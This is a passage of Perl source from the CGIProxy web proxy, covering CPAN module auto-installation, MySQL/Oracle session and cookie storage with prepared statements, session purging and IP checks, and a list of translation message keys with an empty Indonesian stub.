    @ENV{qw(PERL_LOCAL_LIB_ROOT PERL_MB_OPT PERL_MM_OPT PERL5LIB)}= ('') x 4  if $>==0 ;

    my @failed ;
    foreach (@modules) {
	my $rv= require_with_install($_) ;
	if    ($rv==2) { print "$_ installation succeeded\n" }
	elsif ($rv!=1) { print "FAILED: [$_] [$rv]\n" ; push(@failed, $_) }
    }
    print("Failed to install: [@failed]\n")  if @failed ;

    if ($installed_local_lib) {
	my $env= local::lib->environment_vars_string_for(CPAN::FirstTime::_local_lib_path()) ;
	if ($^O=~ /win/i) {
	    print <<EOI ;


$env
EOI
	} else {
	    my $startup_file= $ENV{SHELL}=~ /csh/  ? '.cshrc'  : '.bashrc' ;
	    print <<EOI ;

$env
EOI
	    my $resp ;
	    do {
		print "Do you want them to be added for you right now? [y/n] " ;
		$resp= <> ;
		if ($resp=~ /^y/i) {
		    $startup_file= File::Spec->catfile(CPAN::FirstTime::_local_lib_home(), $startup_file) ;
		    open(STARTUP, '>>', $startup_file) or die "Can't open $startup_file: $!\n" ;
		    print STARTUP $env ;
		    close(STARTUP) ;
		}
	    } until $resp=~ /^[yn]/i ;
	}
	my $local_lib_dir= CPAN::FirstTime::_local_lib_path() ;
	print <<EOI ;

IMPORTANT: Since we installed local::lib, you need to configure CGIProxy to
look in the directory it uses, by setting \$LOCAL_LIB_DIR='$local_lib_dir'
near the top of the script.
EOI
    }

    eval { require JSON } ;  # don't check during compilation
    die "CGIProxy currently requires the JSON module for security in JavaScript,\nand it wasn't installed successfully.\n" if $@ ;
}

sub require_with_install {
    my($module, $die_on_failure)= @_ ;
    eval "require $module" ;
    return 1 unless $@ ;
    warn "Couldn't require $module, attempting install: $@\n" ;   # jsm-- see warnings, and handle normal cases here!
    require CPAN ;   # big module; don't require until needed
    CPAN::Shell->install($module) ;
    # install() doesn't always return true upon success, so test it.
    eval "require $module" ;
    if ($@) {
	return undef unless $die_on_failure ;
	&HTMLdie([<<EOM, $module, $module]) ;
Couldn't install Perl's %s module.  Try installing it manually,
perhaps by running "cpan %s" from the command line.
EOM
    }
    return 2 unless $@ ;
    return undef unless $die_on_failure ;
    &HTMLdie(["Seemed to install %s OK, but can't load it.", $module]) ;
}

sub create_database_as_needed {
    require_with_install('DBI', 1) ;
    $DBH||= DBI->connect("dbi:$DB_DRIVER:database=$DB_NAME;$DB_HOSTPORT", $DB_USER, $DB_PASS, { AutoCommit => 1 }) ;
    if (!$DBH) {   # jsm-- handle other common error cases!
	# No $DB_NAME database yet; try to connect to engine with no database requested.
	$DBH= DBI->connect("dbi:$DB_DRIVER:$DB_HOSTPORT", $DB_USER, $DB_PASS, { AutoCommit => 1 })
	    or &HTMLdie(["Can't connect to database engine: %s", $DBI::errstr]) ;
	defined $DBH->do("create database $DB_NAME ;")   # jsm-- but what if it's there already?
	    or &HTMLdie(["Can't create database '%s' (try doing it manually): %s", $DB_NAME, $DBI::errstr]) ;
	$DBH= DBI->connect("dbi:$DB_DRIVER:database=$DB_NAME;$DB_HOSTPORT", $DB_USER, $DB_PASS, { AutoCommit => 1 })
	    or &HTMLdie(["Can't connect to new '%s' database: %s", $DB_NAME, $DBI::errstr]) ;
    }

    return if $DBH->tables ;

    my(@stmts)= split(/;/, <<EOS) ;
create table session (
  id varchar(64) NOT NULL,
  ip_address varchar(15) NOT NULL,
  last_used datetime NOT NULL,
  CONSTRAINT id PRIMARY KEY (id)
) ;
create index session_last_used on session (last_used) ;
create index session_ip_address on session (ip_address) ;

create table cookie (
  session varchar(64) NOT NULL,
  name varchar(4096),
  value varchar(4096),
  expires datetime,
  domain varchar(256),
  path varchar(1024),
  secure tinyint,
  httponly tinyint,
  CONSTRAINT session_con FOREIGN KEY(session)
    REFERENCES session(id)
    ON DELETE CASCADE
) ;
create index cookie_session_path_domain on cookie (session, path, domain) ;
create index cookie_expires on cookie (expires) ;
EOS
    /\S/ && !$DBH->do($_)
	&& &HTMLdie(["Can't create database tables: %s", $DBI::errstr])  for @stmts ;

}

sub store_cookie_in_db {
    my($name, $value, $expires_clause, $path, $domain, $secure_clause, $httponly_clause)= @_ ;

    my($expires)= $expires_clause=~ /^expires\s*=\s*([^;]*)/i ;
    my $secure= $secure_clause ne ''  ? 1  : 0 ;
    my $httponly= $httponly_clause ne ''  ? 1  : 0 ;

    if (defined $expires) {
	my @t= $expires=~ /^\w+,\s*(\d+)[ -](\w+)[ -](\d+)\s+(\d+):(\d+):(\d+)/ ;
	$t[1]= $UN_MONTH{lc($t[1])} ;
	$t[2]+= 2000 if length($t[2])==2 ;
	$expires= defined $t[5]
	    ? sprintf('%04s-%02s-%02s %02s:%02s:%02s', @t[2, 1, 0, 3, 4, 5])
	    : undef ;
    }

    # Try to update existing cookie.
    $STH_UPD_COOKIE||= $DBH->prepare('UPDATE cookie SET value=?, expires=?, secure=?, httponly=? '
				   . 'WHERE session=? AND name=? AND domain=? AND path=?') ;
    &HTMLdie(["Can't prepare %s: %s", 'STH_UPD_COOKIE', $DBI::errstr]) unless defined $STH_UPD_COOKIE ;
    my $rv= $STH_UPD_COOKIE->execute($value, $expires, $secure, $httponly,
				     defined $expires  ? $session_id_persistent  : $session_id,
				     $name, $domain, $path) ;
    return 1 if $rv==1 ;    # success

    # Cookie doesn't exist yet; try an INSERT.
    $STH_INS_COOKIE||= $DBH->prepare('INSERT INTO cookie (session, name, value, expires, domain, path, secure, httponly) '
				      . 'VALUES (?, ?, ?, ?, ?, ?, ?, ?)') ;
    &HTMLdie(["Can't prepare %s: %s", 'STH_INS_COOKIE', $DBI::errstr]) unless defined $STH_INS_COOKIE ;
    $rv= $STH_INS_COOKIE->execute(defined $expires  ? $session_id_persistent  : $session_id,
				  $name, $value, $expires, $domain, $path, $secure, $httponly) ;
    return 1 if $rv==1 ;    # success

    &HTMLdie(["Can't store cookie in database: %s", $DBI::errstr]) ;
}

sub get_cookies_from_db {
    my($path, $host, $port, $scheme, $for_js)= @_ ;

    if (!$STH_SEL_COOKIE) {
	if ($DB_DRIVER eq 'mysql') {
	    # MySQL doesn't (can't) support the standard "||" concatenation operator,
	    #   but provides CONCAT() .
	    $STH_SEL_COOKIE= $DBH->prepare(<<EOS) ;
SELECT name, value, httponly FROM cookie
WHERE (session=? OR session=?)
  AND (domain=? OR ? LIKE CONCAT("%", domain))
  AND ? LIKE CONCAT(path, "%")
  AND (expires>UTC_TIMESTAMP() OR expires IS NULL)
  AND (?='https' OR secure=0)
ORDER BY LENGTH(path) DESC ;
EOS
	} elsif ($DB_DRIVER eq 'Oracle') {
	    $STH_SEL_COOKIE= $DBH->prepare(<<EOS) ;
SELECT name, value, httponly FROM cookie
WHERE (session=? OR session=?)
  AND (domain=? OR ? LIKE "%"||domain)
  AND ? LIKE path||"%"
  AND (expires>SYS_EXTRACT_UTC(SYSTIMESTAMP) OR expires IS NULL)
  AND (?='https' OR secure=0)
ORDER BY LENGTH(path) DESC ;
EOS
	} else {
	    &HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER]) ;
	}
	&HTMLdie(["Can't prepare %s: %s", 'STH_SEL_COOKIE', $DBH->errstr]) unless defined $STH_SEL_COOKIE ;
    }

    # Grab all results and push into @cookie array, avoiding duplicates.
    my $rv= $STH_SEL_COOKIE->execute($session_id, $session_id_persistent, $host, $host, $path, $scheme) ;
    &HTMLdie(["Can't STH_SEL_COOKIE->execute: %s", $DBI::errstr])  unless defined $rv ;
    $rv= $STH_SEL_COOKIE->fetchall_arrayref ;
    @$rv= grep {!$_->[2]} @$rv  if $for_js ;   # exclude cookies where httponly=1
    my(@cookies, %done) ;
    !$done{$_->[0]} && (push(@cookies, "$_->[0]=$_->[1]"), $done{$_->[0]}++)  foreach @$rv ;
    return join(';', @cookies) ;
}


# Get all cookies for a user from the database, returning them in an array of
#   hashes.  This is used for cookie management.
sub get_all_cookies_from_db {
    connect_to_db() ;

    if (!$STH_SEL_ALL_COOKIES) {
	if ($DB_DRIVER eq 'mysql') {
	    $STH_SEL_ALL_COOKIES= $DBH->prepare(<<EOS) ;
SELECT name, value, expires, domain, path, secure, httponly FROM cookie
WHERE (session=? OR session=?) AND (expires>UTC_TIMESTAMP() OR expires IS NULL) ;
EOS
	} elsif ($DB_DRIVER eq 'Oracle') {
	    $STH_SEL_ALL_COOKIES= $DBH->prepare(<<EOS) ;
SELECT name, value, expires, domain, path, secure, httponly FROM cookie
WHERE (session=? OR session=?) AND (expires>SYS_EXTRACT_UTC(SYSTIMESTAMP) OR expires IS NULL) ;
EOS
	} else {
	    &HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER]) ;
	}
	&HTMLdie(["Can't prepare %s: %s", 'STH_SEL_ALL_COOKIES', $DBH->errstr]) unless defined $STH_SEL_ALL_COOKIES ;
    }

    my $rv= $STH_SEL_ALL_COOKIES->execute($session_id, $session_id_persistent) ;
    $rv= $STH_SEL_ALL_COOKIES->fetchall_arrayref({}) ;
    return @$rv ;
}

sub delete_cookies_from_db {
    connect_to_db() ;

    if (!$STH_DEL_COOKIE) {
	$STH_DEL_COOKIE= $DBH->prepare('DELETE FROM cookie WHERE (session=? OR session=?) AND domain=? AND path=? AND name=?;') ;
	&HTMLdie(["Can't prepare %s: %s", 'STH_DEL_COOKIE', $DBH->errstr]) unless defined $STH_DEL_COOKIE ;
    }

    foreach (@_) {
	$_= cookie_decode($_) ;
	my $rv= $STH_DEL_COOKIE->execute($session_id, $session_id_persistent, split(/;/)) ;
	&HTMLdie(["Can't delete cookie (%s): %s", $_, $DBI::errstr])  unless defined $rv ;
    }
}

sub delete_all_cookies_from_db {
    connect_to_db() ;

    if (!$STH_DEL_ALL_COOKIES) {
	$STH_DEL_ALL_COOKIES= $DBH->prepare('DELETE FROM cookie WHERE (session=? OR session=?) ;') ;
	&HTMLdie(["Can't prepare %s: %s", 'STH_DEL_ALL_COOKIES', $DBH->errstr]) unless defined $STH_DEL_ALL_COOKIES ;
    }
    my $rv= $STH_DEL_ALL_COOKIES->execute($session_id, $session_id_persistent) ;
    &HTMLdie($DBI::errstr)  unless defined $rv ;
}

sub update_session_record {
    my($session_id)= @_ ;

    # Try to update existing record.
    if (!$STH_UPD_SESSION) {
	if ($DB_DRIVER eq 'mysql') {
	    $STH_UPD_SESSION= $DBH->prepare('UPDATE session SET last_used=UTC_TIMESTAMP() WHERE id=?') ;
	} elsif ($DB_DRIVER eq 'Oracle') {
	    $STH_UPD_SESSION= $DBH->prepare('UPDATE session SET last_used=SYS_EXTRACT_UTC(SYSTIMESTAMP) WHERE id=?') ;
	} else {
	    &HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER]) ;
	}
	&HTMLdie(["Can't prepare %s: %s", 'STH_UPD_SESSION', $DBI::errstr]) unless defined $STH_UPD_SESSION ;
    }
    my $rv= $STH_UPD_SESSION->execute($session_id) ;
    return 1 if $rv==1 ;    # success

    # Cookie doesn't exist yet; try an INSERT.
    if (!$STH_INS_SESSION) {
	if ($DB_DRIVER eq 'mysql') {
	    $STH_INS_SESSION= $DBH->prepare('INSERT INTO session (id, ip_address, last_used) VALUES (?, ?, UTC_TIMESTAMP())') ;
	} elsif ($DB_DRIVER eq 'Oracle') {
	    $STH_INS_SESSION= $DBH->prepare('INSERT INTO session (id, ip_address, last_used) VALUES (?, ?, SYS_EXTRACT_UTC(SYSTIMESTAMP))') ;
	} else {
	    &HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER]) ;
	}
	&HTMLdie(["Can't prepare %s: %s", 'STH_INS_SESSION', $DBI::errstr]) unless defined $STH_INS_SESSION ;
    }
    $rv= $STH_INS_SESSION->execute($session_id, $ENV{REMOTE_ADDR}) ;
    return 1 if $rv==1 ;    # success

    &HTMLdie(["Can't update session record: %s", $DBI::errstr]) ;
}
sub purge_db {
    connect_to_db() ;

    if (!$STH_PURGE_SESSIONS) {
	if ($DB_DRIVER eq 'mysql') {
	    $STH_PURGE_SESSIONS= $DBH->prepare('DELETE FROM session WHERE last_used<TIMESTAMPADD(HOUR,-1,UTC_TIMESTAMP());') ;
	} elsif ($DB_DRIVER eq 'Oracle') {
	    $STH_PURGE_SESSIONS= $DBH->prepare('DELETE FROM session WHERE last_used<SYS_EXTRACT_UTC(SYSTIMESTAMP)-1/24;') ;
	} else {
	    &HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER]) ;
	}
	&HTMLdie(["Can't prepare %s: %s", 'STH_PURGE_SESSIONS', $DBH->errstr]) unless defined $STH_PURGE_SESSIONS ;
    }
    my $rv= $STH_PURGE_SESSIONS->execute() ;
    &HTMLdie(["Can't purge sessions: %s", $DBI::errstr])  unless defined $rv ;

    if (!$STH_PURGE_COOKIES) {
	if ($DB_DRIVER eq 'mysql') {
	    $STH_PURGE_COOKIES= $DBH->prepare('DELETE FROM cookie WHERE expires<UTC_TIMESTAMP();') ;   # jsm-- extend this!
	} elsif ($DB_DRIVER eq 'Oracle') {
	    $STH_PURGE_COOKIES= $DBH->prepare('DELETE FROM cookie WHERE expires<SYS_EXTRACT_UTC(SYSTIMESTAMP);') ; # ditto
	} else {
	    &HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER]) ;
	}
	&HTMLdie(["Can't prepare %s: %s", 'STH_PURGE_COOKIES', $DBH->errstr]) unless defined $STH_PURGE_COOKIES ;
    }
    $rv= $STH_PURGE_COOKIES->execute() ;
    &HTMLdie(["Can't purge cookies: %s", $DBI::errstr])  unless defined $rv ;
}

sub verify_ip_address {
    my($session_id)= @_ ;

    $STH_SEL_IP||= $DBH->prepare('SELECT ip_address FROM session WHERE id=?') ;
    &HTMLdie(["Can't prepare %s: %s", 'STH_SEL_IP', $DBI::errstr]) unless defined $STH_SEL_IP ;
    my $rv= $STH_SEL_IP->execute($session_id) ;
    my @rv= $STH_SEL_IP->fetchrow_array ;
    &HTMLdie(["Can't STH_SEL_IP->fetchrow_array(): %s", $DBI::errstr])  unless @rv ;
    return $rv[0] eq $ENV{REMOTE_ADDR} ;
}

sub connect_to_db {
    if (!$DBH) {
	&HTMLdie(["Sorry, can't support %s database yet.", $DB_DRIVER])  unless $DB_DRIVER=~ /^(?:mysql|Oracle)$/ ;
	create_database_as_needed() ;
	$DBH= DBI->connect("dbi:$DB_DRIVER:database=$DB_NAME;$DB_HOSTPORT", $DB_USER, $DB_PASS, { AutoCommit => 1 }) ;
	&HTMLdie(["Can't connect to database: %s", $DBI::errstr])  unless defined $DBH ;
    }
}
sub get_translations {
    use utf8 ;
    my($lang)= @_ ;

    # All message keys are one line, and don't include "\n".
    @MSG_KEYS= split(/\n/, <<'EOM')  unless @MSG_KEYS ;
Authorization failed.  Try again.
Bad opcode: [%s] at position %s in method body %s.
Buka
CGIProxy Error
Can't SSL connect: %s
Can't STH_SEL_COOKIE->execute: %s
Can't STH_SEL_IP->fetchrow_array(): %s
Can't connect to database engine: %s
Can't connect to database: %s
Can't connect to new '%s' database: %s
Can't create SSL connection: %s
Can't create SSL context: %s
Can't create database '%s' (try doing it manually): %s
Can't create database tables: %s
Can't delete cookie (%s): %s
Can't prepare %s: %s
Can't purge cookies: %s
Can't purge sessions: %s
Can't set_fd: %s
Can't store cookie in database: %s
Can't update session record: %s
Connecting from wrong IP address.
Couldn't bind FTP data socket: %s
Couldn't connect to %s:%s: %s
Couldn't create FTP data socket: %s
Couldn't create socket: %s
Couldn't deflate: %s
Couldn't find address for %s: %s
Couldn't gunzip: %s
Couldn't gzip: %s
Couldn't inflate: %s
Couldn't install Perl's %s module.  Try installing it manually, perhaps by running "cpan %s" from the command line.
Couldn't listen on FTP data socket: %s
Delete selected cookies
Enter the URL you wish to visit in the box below.
Error accepting FTP data socket: %s
Error by target server: no WWW-Authenticate header.
Error reading chunked response from %s .
Go
Intruder Alert!  Someone other than the server is trying to send you data.
Invalid response from %s: [%s]
Manage cookies
Net::SSLeay::free error: %s
Net::SSLeay::read error: %s
No response from %s:%s
No response from SSL proxy
Restart
SSL proxy error; response was:<p><pre>%s</pre>
Seemed to install %s OK, but can't load it.
Shouldn't get here, token= [%s]
Sorry, can't support %s database yet.
Sorry, no such function as //%s
Sorry, only HTTP and FTP are currently supported.
Sorry, this proxy can't handle a request larger than %s bytes at a password-protected URL.  Try reducing your submission size, or submit it to an unprotected URL.
The URL must contain a valid host name.
The URL you entered has an invalid host name.
The target URL cannot contain an empty host name.
Too many MIME types to register.
UP
You are not currently authenticated to any sites through this proxy.
You are not currently sending any cookies through this proxy.
banned_server_die.response
banned_user_die.response
chunked read() error: %s
download
ftp_dirfix.response
ftp_error.response
get_auth_from_user.response
insecure_die.response
loop_disallowed_die.response
malformed_unicode_die.response
manage_cookies.cookie_header_row1
manage_cookies.cookie_header_row2
manage_cookies.response
mini_start_form.ret1
mini_start_form.ret2
no_Encode_die.response
no_SSL_warning.response
no_gzip_die.response
non_text_die.response
read() error: %s
safety
script_content_die.response
show_start_form.flags
show_start_form.response
ssl_read_all_fixed() error: %s
unsupported_warning.response
EOM
if ($lang eq 'id') {
return if $MSG{$lang} ;
@{$MSG{$lang}}{@MSG_KEYS}= ('',) ;}}
sub flags_HTML {return { 'id' =>'',};}